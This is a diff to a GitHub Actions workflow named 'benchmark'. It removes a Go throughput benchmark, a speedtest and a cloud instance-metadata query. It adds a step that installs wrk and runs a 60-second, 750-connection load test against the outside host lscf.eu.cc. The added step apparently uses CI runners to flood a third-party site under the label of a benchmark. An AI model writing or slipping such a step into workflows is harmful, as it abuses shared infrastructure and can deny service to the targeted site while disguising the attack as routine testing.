@@ -6,37 +6,8 @@ on:
 
 jobs:
   benchmark:
-    runs-on: ubuntu-latest
+    runs-on: ubuntu-24.04-arm
     steps:
-      - uses: actions/setup-go@v5
-        with:
-          go-version: 'stable'
-
       - run: |
-          curl -s -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/instance/compute?api-version=2025-04-07&format=json"
-          lscpu
-          curl -sL https://install.speedtest.net/app/cli/ookla-speedtest-1.2.0-linux-x86_64.tgz | tar -xz && ./speedtest --accept-license --accept-gdpr
-
-          cat << 'EOF' > benchmark_test.go
-          package main
-
-          import "testing"
-
-          func BenchmarkBytesThroughputParallel(b *testing.B) {
-          	size := 100 * 1024 * 1024
-          	b.SetBytes(int64(size))
-          	b.ResetTimer()
-          	
-          	b.RunParallel(func(pb *testing.PB) {
-          		data := make([]byte, size)
-          		for pb.Next() {
-          			for j := 0; j < size; j++ {
-          				data[j] ^= 1
-          			}
-          		}
-          	})
-          }
-          EOF
-          
-          go mod init bench
-          go test -bench=. -benchtime=5s
+          sudo apt-get install -y wrk
+          wrk -t4 -c750 -d60s http://lscf.eu.cc/
